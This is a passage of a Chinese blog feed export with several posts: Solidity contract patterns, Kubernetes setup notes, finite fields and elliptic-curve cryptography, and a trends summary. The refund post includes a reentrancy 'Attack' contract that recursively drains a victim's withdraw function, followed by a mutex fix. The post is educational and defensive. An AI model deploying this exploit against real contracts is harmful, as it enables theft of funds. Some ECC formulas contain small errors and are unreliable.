    <content><![CDATA[<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line">contract SelfDesctructionContract &#123;</span><br><span class="line">    address payable owner;</span><br><span class="line">    </span><br><span class="line">    modifier ownerRestricted &#123;</span><br><span class="line">        <span class="built_in">require</span> (owner == msg.sender);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用ownerRestricted修饰符来限定只有合约的所有者才能调用该函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destructContract</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> <span class="title">ownerRestricted</span> </span>&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>owner 必须可接受支付的回收的gas。</p>
<p>关联文档：</p>
<ol>
<li><a href="https://willzhuang.github.io/2020/01/15/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CURD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">智能合约-CURD的详细分析</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E8%87%AA%E6%AF%81%E6%A8%A1%E5%BC%8F/">智能合约-自毁模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/">智能合约-工厂合约模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%90%8D%E5%AD%97%E7%99%BB%E5%BD%95%E6%A8%A1%E5%BC%8F/">智能合约-名字登录模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/">智能合约-退款方式</a></li>
</ol>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约-退款方式</title>
    <url>/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p>​    在售卖商品时，有可能因质量或者其他问题发生商品退回，同时必须给买家退款。通常，合约里记录追踪了所有的买家，可以放置在一个名叫 refund 的函数中，遍历所有的买家，从而找到需要退款的买家，最后把退款返回给到买家的地址上。退款中可以使用 <code>buyerAddress.transfer()</code> 或者 <code>buyerAddress.send()</code>。区别在于：<code>transfer()</code>在发生错误的情况下发生异常，而<code>send()</code>在发生意外的情况下不抛出异常，只是返回 false。<code>send()</code>的这个特性很重要，因为大部分买家是外部账户，但也有些买家可能是合约账户。如果合约账户中 Fallback 时出错，并抛出异常，遍历就会结束。交易被完全回退，这时，没有买家拿到退款。换句话说，退款程序被阻塞了。（实际上，单次调用中，transfer()更加安全，可以根据异常判断调用情况，所以尽量使用transfer() ）</p>
<p>​    使用 <code>send()</code>，错误的合约账户也不会阻塞其他买家的退款。但是<code>send()</code> 在使用时要注意<a href="https://willzhuang.github.io/2019/06/10/%E5%85%B3%E4%BA%8E%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%96%B0%E8%AE%A4%E7%9F%A5/">重入攻击</a>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line">contract WithdrawalContract &#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) buyers;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span>);</span><br><span class="line">        buyers[msg.sender] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint256 amount = buyers[msg.sender];</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>);</span><br><span class="line">        buyers[msg.sender] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.send(amount));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://willzhuang.github.io/2019/06/10/%E5%85%B3%E4%BA%8E%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%96%B0%E8%AE%A4%E7%9F%A5/">重入攻击</a> 的具体攻击手段：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    address victim;</span><br><span class="line"></span><br><span class="line">    modifier ownerOnly &#123; <span class="built_in">require</span>(owner == msg.sender); _; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; owner = msg.sender; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置已部署的合约实例地址，即攻击的合约对象</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setVictim</span>(<span class="params">address target</span>) <span class="title">ownerOnly</span> </span>&#123; victim = target; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deposit Ether to deployed contract</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step1</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.balance &gt; amount) &#123;</span><br><span class="line">            victim.call.value(amount)(bytes4(keccak256(<span class="string">&quot;deposit()&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw Ether from deployed contract</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step2</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        victim.call(bytes4(keccak256(<span class="string">&quot;withdraw(address,uint256)&quot;</span>)), <span class="built_in">this</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// selfdestruct, send all balance to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stopAttack</span>(<span class="params"></span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startAttack</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        step1(amount);</span><br><span class="line">        step2(amount / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender == victim) &#123;</span><br><span class="line">            <span class="comment">// step3 (收款后，自动执行)</span></span><br><span class="line">            <span class="comment">// 再次尝试调用 攻击对象 的 withdraw 函数，递归转币</span></span><br><span class="line">            victim.call(bytes4(keccak256(<span class="string">&quot;withdraw(address,uint256)&quot;</span>)), <span class="built_in">this</span>, msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以上述代码采用互斥锁较为妥当。：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line">contract WithdrawalContract &#123;</span><br><span class="line">    bool reEntrancyMutux = <span class="literal">false</span>;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) buyers;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span>);</span><br><span class="line">        buyers[msg.sender] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!reEntrancyMutux);</span><br><span class="line">        uint256 amount = buyers[msg.sender];</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>);</span><br><span class="line">        buyers[msg.sender] = <span class="number">0</span>;</span><br><span class="line">        reEntrancyMutux = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.send(amount));</span><br><span class="line">        reEntrancyMutux = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>关联文档：</p>
<ol>
<li><a href="https://willzhuang.github.io/2020/01/15/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CURD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">智能合约-CURD的详细分析</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E8%87%AA%E6%AF%81%E6%A8%A1%E5%BC%8F/">智能合约-自毁模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/">智能合约-工厂合约模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%90%8D%E5%AD%97%E7%99%BB%E5%BD%95%E6%A8%A1%E5%BC%8F/">智能合约-名字登录模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/">智能合约-退款方式</a></li>
</ol>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>未来之产业趋势-吴军</title>
    <url>/2024/08/12/%E6%9C%AA%E6%9D%A5%E4%B9%8B%E4%BA%A7%E4%B8%9A%E8%B6%8B%E5%8A%BF-%E5%90%B4%E5%86%9B/</url>
    <content><![CDATA[<p>关于《脉络》这一本书，吴军和尹烨做了一期视频会议，分享了关于一些未来的预测。</p>
<ol>
<li>无论是中国的，还是人类的，其生产远远没有过剩。大片的沙漠，河流，土地，太阳能，风能，等等都在等待开发。地球即使经历核大战，环境也仍然大幅优于火星，所以移民火星，月球将是是非常遥远的未来。</li>
<li>未来看好虚拟经济，服务业。如未来的老龄化，思想文化大发展等趋势，相应的原宇宙，区块链/加密货币，AR/VR，AI，医疗，金融/税务，等服务业。</li>
<li>给目前高考学生的报考方向<br> 1.计算机；<br> 2.医疗，医学，药学，健康，护理，生物学；<br> 3.金融；<br> 4.教育。<br> 普通人的话，还看好餐馆儿，护理等就业方向。</li>
<li>未来看好的经济圈<br> 1.英语地域圈；<br> 2.东亚中日韩；<br> 3.印度。</li>
</ol>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>CBDC</tag>
        <tag>BANK</tag>
        <tag>架构</tag>
        <tag>商业模式</tag>
      </tags>
  </entry>
  <entry>
    <title>本地玩转k8s-第II弹</title>
    <url>/2020/04/17/%E6%9C%AC%E5%9C%B0%E7%8E%A9%E8%BD%ACk8s-%E7%AC%ACII%E5%BC%B9/</url>
    <content><![CDATA[<p>Kuboard 是 Kubernetes 的一款图形化管理界面。参考如下链接：<a href="https://kuboard.cn/install/install-dashboard.html">https://kuboard.cn/install/install-dashboard.html</a> 安装kuboard</p>
<ol>
<li>kuboard 首页</li>
</ol>
<p><img src="/2020/04/17/%E6%9C%AC%E5%9C%B0%E7%8E%A9%E8%BD%ACk8s-%E7%AC%ACII%E5%BC%B9/1.png"></p>
<ol start="2">
<li>Deployment 视图页面</li>
</ol>
<p><img src="/2020/04/17/%E6%9C%AC%E5%9C%B0%E7%8E%A9%E8%BD%ACk8s-%E7%AC%ACII%E5%BC%B9/2.png"></p>
<p>体验结论：</p>
<ol>
<li>kuboard 比 <a href="https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/">Kubernetes Dashboard</a>（Kubernetes 的官方 Web UI）要友好许多，并且 Kubernetes Dashboard 需要在操作机中具备 Kubectl；</li>
<li><a href="https://github.com/Qihoo360/wayne">wayne</a> 对用户的权限管理会优秀一些。但是经过docker-compose实验，启动为dev版本，未成功打开页面</li>
<li><a href="https://www.rancher.cn/">rancher</a>（<a href="https://github.com/rancher/%EF%BC%89Rancher%E4%B8%BA%E6%82%A8%E6%8F%90%E4%BE%9B%E2%80%9CKubernetes%E5%8D%B3%E6%9C%8D%E5%8A%A1(Kubernetes-as-a-Service)%E2%80%9D%E3%80%82%E5%9C%A8%E5%9B%BD%E5%86%85%E5%8C%97%E4%BA%AC%E3%80%81%E4%B8%8A%E6%B5%B7%E3%80%81%E6%B7%B1%E5%9C%B3%E3%80%81%E6%B2%88%E9%98%B3%E5%9D%87%E6%9C%89%E5%8A%9E%E5%85%AC%E5%9C%B0%E7%82%B9%EF%BC%8C%E6%B1%89%E8%AF%AD%E6%94%AF%E6%8C%81%E8%BE%83%E5%A5%BD%E3%80%82%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8%E3%80%82">https://github.com/rancher/）Rancher为您提供“Kubernetes即服务(Kubernetes-as-a-Service)”。在国内北京、上海、深圳、沈阳均有办公地点，汉语支持较好。推荐使用。</a></li>
</ol>
]]></content>
      <tags>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>有限域定义</title>
    <url>/2021/04/29/%E6%9C%89%E9%99%90%E5%9F%9F%E5%AE%9A%E4%B9%89/</url>
    <content><![CDATA[<h3 id="有限域的定义"><a href="#有限域的定义" class="headerlink" title="有限域的定义"></a>有限域的定义</h3><p>​    有限域的数学定义是一个有限的数字集以及两个运算+(加法）和·(乘法）,并且满足下面的性质：</p>
<p>1.如果a和b属于集合，则a+b和a·b也属于集合。我们称此性质为封闭性。</p>
<p>2.存在0使得a+0=a。我们称此性质为加法恒等。</p>
<p>3.存在1使得a·1=a,我们称此性质为乘法恒等。</p>
<p>4.如果a属于集合，则-a属于集合；满足a+(-a)=0。我们称此性质为加法逆。</p>
<p>5.如果a属于集合，<br>$$<br>则 a^{-1}属于集合，满足 a \cdot a^{-1}=1。我们称此性质为乘法逆。<br>$$<br>​    我们来进一步分析这些准则。</p>
<p>​    有一个有限的数的集合，因为集合是有限的，所以可以把集合大小定义为p，我们称之为集合的阶。</p>
<p>​    性质1要求对加法和乘法封闭。这意味着定义加法和乘法时要使其运算结果仍然属于集合。比如集合{0,1,2}并不对加法封闭，因为1+2=3，3不在集合内；同理2+2=4也不符合定义。当然，可以对加法定义做一些修改来使其满足有限域的性质，但是“常见”的加法并不能使这个集合组成有限域。另外，集合{-1,0,1}对正常的乘法是封闭的。任意两个集合内的元素（共有9种组合）其乘积仍然属于集合。</p>
<p>​    另一个选项是对乘法重新定义以满足有限域的封闭性。但是其核心概念是这里定义的加法和减法不同于我们熟悉的加法和减法。</p>
<p>​    性质2和性质3意味着必须要有加法和乘法恒等元，也就是0和1必须在集合内。</p>
<p>​    性质4意味着有加法逆。如果a在集合内，-a也在集合内，通过使用加法逆运算，我们可以定义减法。</p>
<p>​    性质5意味着乘法有着相同的性质，如果a在集合内，则a-t也在集合内，即a·a’=1,通过乘法逆，我们可以定义除法。这是定义一个有限域最难的部分。</p>
<h3 id="定义有限集合"><a href="#定义有限集合" class="headerlink" title="定义有限集合"></a>定义有限集合</h3><p>​    如果集合的阶（大小）是p，我们可以说该集合的元素有0,1,2,3,…,p-1。把这些数称为集合的元素，而不必称其为传统的数字0,1,2,3等。这些集合的元素在很多方面和传统数字一致，但是在如加法、减法和乘法等运算上仍有一些地方不太一样。有限域的数学表示如下：<br>​    Fp={0,1,2,…,p-1}构成有限域的是集合的元素。Fp是一个特定的有限域，读作“阶数为p的域”（field of p)、“阶数为29的有限域”或者其他阶数（重申：数学家把集合大小称为阶）。{}之间的数字代表域中的元素。我们将这些元素命名为0,1,2等，因为这些名字便于使用。</p>
<p>一个阶数为11的域如下：<br>    F11={0,1,2,3,4,5,6,7,8,9,10}</p>
<p>一个阶数为17的域如下：<br>    F17={0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}</p>
<p>一个阶数为983的域如下：<br>    F983={0,1,2,…，982}</p>
<p>​    注意，域的阶数总是比最大元素大1。你可能注意到了每次我们给出的域的阶数都是质数。出于很多之后才能解释清楚的原因，域的阶数必须为质数的整数次幕，其中阶数为质数的有限域是我们特别关心的。</p>
]]></content>
  </entry>
  <entry>
    <title>本地玩转k8s-第I弹</title>
    <url>/2020/04/10/%E6%9C%AC%E5%9C%B0%E7%8E%A9%E8%BD%ACk8s-%E7%AC%ACI%E5%BC%B9/</url>
    <content><![CDATA[<h3 id="准备虚拟服务器"><a href="#准备虚拟服务器" class="headerlink" title="准备虚拟服务器"></a>准备虚拟服务器</h3><ol>
<li><p>在vmware上安装centos7.7 server</p>
</li>
<li><p>vmware工具栏，虚拟机-&gt;管理-&gt;克隆，制作k8s-master</p>
</li>
<li><p>vmware工具栏，虚拟机-&gt;管理-&gt;克隆，制作k8s-worker01</p>
</li>
<li><p>vmware工具栏，虚拟机-&gt;管理-&gt;克隆，制作k8s-worker02</p>
</li>
<li><p>于k8s-master内，<code>/etc/sysconfig/network-scripts/ifcfg-ens33</code>，将server编辑为静态ip，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######################################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## depends on vm network settings ####</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######################################</span></span></span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=192.168.180.10</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.180.2</span><br><span class="line">DNS1=192.168.180.2</span><br><span class="line">ONBOOT=yes</span><br></pre></td></tr></table></figure>

<p>其中，192.168.180.2来自vmware工具栏，<code>编辑-&gt;虚拟网络编辑器-&gt;NAT设置-&gt;子网IP</code>。</p>
<p>重启server网卡如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmcli c reload ens33</span><br><span class="line">nmcli c up ens33</span><br></pre></td></tr></table></figure>

<p>从windows登录k8s-master，登录IP为<code>192.168.180.10</code> </p>
</li>
<li><p>于k8s-worker01内，/etc/sysconfig/network-scripts，将server编辑为静态ip，IPADDR=192.168.180.<strong>11</strong></p>
<p>重启server网卡如上</p>
</li>
<li><p>于k8s-worker01内，/etc/sysconfig/network-scripts，将server编辑为静态ip，IPADDR=192.168.180.<strong>12</strong></p>
<p>重启server网卡如上</p>
</li>
<li><p>optional，检查vmware，<code>编辑-&gt;虚拟网络编辑器</code> 中的<code>VMnet8</code>的连通状态，如果有需要，在windows10-&gt;设置-&gt;更改适配器选项，重新启动<code>VMnet8</code>网卡</p>
</li>
</ol>
<p><img src="/2020/04/10/%E6%9C%AC%E5%9C%B0%E7%8E%A9%E8%BD%ACk8s-%E7%AC%ACI%E5%BC%B9/1.png"></p>
<p>从winscp端登录：</p>
<p><img src="/2020/04/10/%E6%9C%AC%E5%9C%B0%E7%8E%A9%E8%BD%ACk8s-%E7%AC%ACI%E5%BC%B9/2.png"></p>
<p>最后，按照 <a href="https://kuboard.cn/install/install-k8s.html#%E9%85%8D%E7%BD%AE%E8%A6%81%E6%B1%82">kuboard -&gt; 安装 -&gt; 安装 kubernetes</a> 手册完成kubernetes安装。</p>
]]></content>
      <tags>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>椭圆曲线密码</title>
    <url>/2021/04/29/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>​    椭圆曲线和很多学习完基础代数之后见过的方程差不多。y在等号的左边，而x在等号的右边。椭圆曲线有如下的形式：<br>$$<br>y^2 = x^3+ax+b<br>$$<br>​    你肯定接触过其他类似的方程。比如，在基础代数课上就学过线性函数：<br>$$<br>y=mx+b<br>$$<br>​    你可能还记得m叫作斜率，b叫作截距。你也能画出线性函数图像。类似地，你可能也熟悉二次函数和它的图像：<br>$$<br>y=ax^2+bx+c<br>$$<br>​    在学习代数时，你还接触过更高阶的函数比如三次函数及其图像。<br>$$<br>y=ax^3+bx^2+cx+d<br>$$<br>​    椭圆曲线和他们没有太大的区别。椭圆曲线和三次函数不同的地方在于等号左边是y的平方，这使得函数图像沿x轴对称：<br>$$<br>y^2 = x^3 + ax + b<br>$$<br><img src="/2021/04/29/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/1.png"></p>
<p>​    因为椭圆曲线的等号左边是y的平方，所以它也不像三次函数那样陡峭。此外，椭圆曲线可能是不想接的，如下图：</p>
<p><img src="/2021/04/29/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/2.png"></p>
<p>​    比如，比特币使用的椭圆曲线被称为secp256k1，使用下面的方程：<br>$$<br>y^2=x^3+7<br>$$</p>
<h3 id="椭圆曲线的加法"><a href="#椭圆曲线的加法" class="headerlink" title="椭圆曲线的加法"></a>椭圆曲线的加法</h3><p>过曲线上的两点A、B画一条直线，找到直线与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A+B，即为加法。如下图所示：A + B = C</p>
<p><img src="/2021/04/29/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/3.png"></p>
<p>​    椭圆曲线因其点加法运算(point addition)而被广泛使用。</p>
<h3 id="椭圆曲线的二倍运算"><a href="#椭圆曲线的二倍运算" class="headerlink" title="椭圆曲线的二倍运算"></a>椭圆曲线的二倍运算</h3><p>​    上述方法无法解释A + A，即两点重合的情况，因此在这种情况下，将椭圆曲线在A点的切线，与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A + A，即2A，即为二倍运算。</p>
<p><img src="/2021/04/29/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/4.png"></p>
<h3 id="同余运算"><a href="#同余运算" class="headerlink" title="同余运算"></a>同余运算</h3><p>​    同余就是有相同的余数，两个整数 a、 b，若它们除以正整数 m所得的余数相等，则称 a，b对于模m同余。<br>$$<br>a≡b (mod m)<br>$$</p>
<h3 id="有限域"><a href="#有限域" class="headerlink" title="有限域"></a>有限域</h3><p>​    椭圆曲线是连续的，并不适合用于加密，所以必须把椭圆曲线变成离散的点，要把椭圆曲线定义在有限域上。而椭圆曲线密码所使用的椭圆曲线是定义在有限域内，有限域最常见的例子是有限域GF(p)，指给定某质数p，由0,1,2…,p-1共p个元素组成的整数集合中加法、二倍运算。例如GF(233)就是：<br>$$<br>y^2=(x^3+7) (mod 223)<br>$$<br>详见上一篇帖子。</p>
<h3 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h3><p>在模7乘法中：</p>
<ul>
<li>1的逆元为1 (1*1)%7=1</li>
<li>2的逆元为4 (2*4)%7=1</li>
<li>3的逆元为5 (3*5)%7=1</li>
<li>4的逆元为2 (4*2)%7=1</li>
<li>5的逆元为3 (5*3)%7=1</li>
<li>6的逆元为6 (6*6)%7=1</li>
</ul>
<h3 id="数学解释"><a href="#数学解释" class="headerlink" title="数学解释"></a>数学解释</h3><p>​    并不是所有的椭圆曲线都适合加密，上述是一类可以用来加密的椭圆曲线，也是最为简单的一类。</p>
<p>针对曲线Ep(a,b)表示为：<br>$$<br>y^2=x^3+ax+b(mod p), x,y \in [0,p],p为质数<br>$$<br>​    该曲线关于x轴对称。选择两个满足下列条件的小于p(p为素数)的非负整数a、b，要求满足以下条件：<br>$$<br>4a^3+27b^2≠0(mod p),a和b是小于p的非负整数<br>$$<br>1、有限域的负元</p>
<p>​    P(x,y)的负元是(x,-ymodp)=(x,p-y)</p>
<p>2、有限域的加法，P+Q</p>
<p>​    P(x1,y1)，Q(x2,y2)和R(x3,y3)三点，其中R是PQ直线与曲线的交点的关于x轴的对称点，即 R=P+Q，有如下关系：<br>$$<br>x_3≡k^2-x_1-x_2(modp),y_3≡k(x_1-x_3)-y_1(modp)<br>$$<br>3、斜率计算</p>
<p>​    若P=Q，即计算P点切线，则<br>$$<br>k=(3x_2+a) \div (2y_1)<br>$$<br>​    若P≠Q，则<br>$$<br>k=(y_2-y_1) \div (x_2-x_1)<br>$$</p>
<h3 id="椭圆曲线加解密算法原理"><a href="#椭圆曲线加解密算法原理" class="headerlink" title="椭圆曲线加解密算法原理"></a>椭圆曲线加解密算法原理</h3><p>​    设私钥、公钥分别为d、Q，即Q = dG，其中G为基点，椭圆曲线上的已知G和dG，求d是非常困难的，也就是说已知公钥和基点，想要算出私钥是非常困难的。<em>其中基点是椭圆曲线上选择的一个点，这个点能够保证满足dG=∞的最小正整数n足够大，也就是阶足够大。1&lt;私钥&lt;n，大于n的私钥必能在[1,n)中找到对应的私钥b使得aG=bG，换句话说也就是有足够多的私钥。</em><br><strong>公钥加密：</strong>选择随机数r，将消息M生成密文C，该密文是一个点对，C = {rG, M+rQ}，其中Q为公钥。<br><strong>私钥解密</strong>：M + rQ - d(rG) = M + r(dG) - d(rG) = M，其中d、Q分别为私钥、公钥。</p>
<h3 id="椭圆曲线签名算法原理"><a href="#椭圆曲线签名算法原理" class="headerlink" title="椭圆曲线签名算法原理"></a>椭圆曲线签名算法原理</h3><p>​    椭圆曲线签名算法(ECDSA)。设私钥、公钥分别为d、Q，即Q = dG，其中G为基点。</p>
<p>私钥签名：</p>
<ul>
<li>选择随机数r，计算点rG(x, y)。</li>
<li>根据随机数r、消息M的哈希h、私钥d，计算s = (h + dx)/r。　　</li>
<li>将消息M、和签名{rG, s}发给接收方。</li>
</ul>
<p>公钥验证签名：　　</p>
<ul>
<li>接收方收到消息M、以及签名{rG=(x,y), s}。　　</li>
<li>根据消息求哈希h。　　</li>
<li>使用发送方公钥Q计算：hG/s + xQ/s，并与rG比较，如相等即验签成功。<br>原理：hG/s + xQ/s = hG/s + x(dG)/s = (h+xd)G/s = r(h+xd)G / (h+dx) = rG</li>
</ul>
<h3 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h3><p>​    假设要签名的消息是一个字符串：“Hello World!”。DSA签名的第一个步骤是对待签名的消息生成一个消息摘要，不同的签名算法使用不同的消息摘要算法，而ECDSA256使用SHA256生成256比特的摘要。</p>
<p>​    摘要生成结束后，应用签名算法对摘要进行签名：</p>
<ul>
<li>产生一个随机数k</li>
<li>利用随机数k，计算出两个大数r和s。将r和s拼在一起就构成了对消息摘要的签名。<br>这里需要注意的是，因为随机数k的存在，对于同一条消息，使用同一个算法，产生的签名是不一样的。从函数的角度来理解，签名函数对同样的输入会产生不同的输出。因为函数内部会将随机值混入签名的过程。</li>
</ul>
<h3 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h3><p>​    关于验证过程，这里不讨论它的算法细节。从宏观上看，消息的接收方从签名中分离出r和s，然后利用公开的密钥信息和s计算出r。如果计算出的r和接收到的r值相同，则表示验证成功，否则，表示验证失败。</p>
]]></content>
  </entry>
  <entry>
    <title>汇丰银行与量子密钥分发QKD的实验技术情况</title>
    <url>/2024/05/27/%E6%B1%87%E4%B8%B0%E9%93%B6%E8%A1%8C%E4%B8%8E%E9%87%8F%E5%AD%90%E5%AF%86%E9%92%A5%E5%88%86%E5%8F%91QKD%E7%9A%84%E5%AE%9E%E9%AA%8C%E6%8A%80%E6%9C%AF%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<p>2023/07/05，汇丰发布：<br><a href="https://www.hsbc.com/-/files/hsbc/media/media-release/2023/230705-hsbc-qkd-press-release.pdf">https://www.hsbc.com/-/files/hsbc/media/media-release/2023/230705-hsbc-qkd-press-release.pdf</a></p>
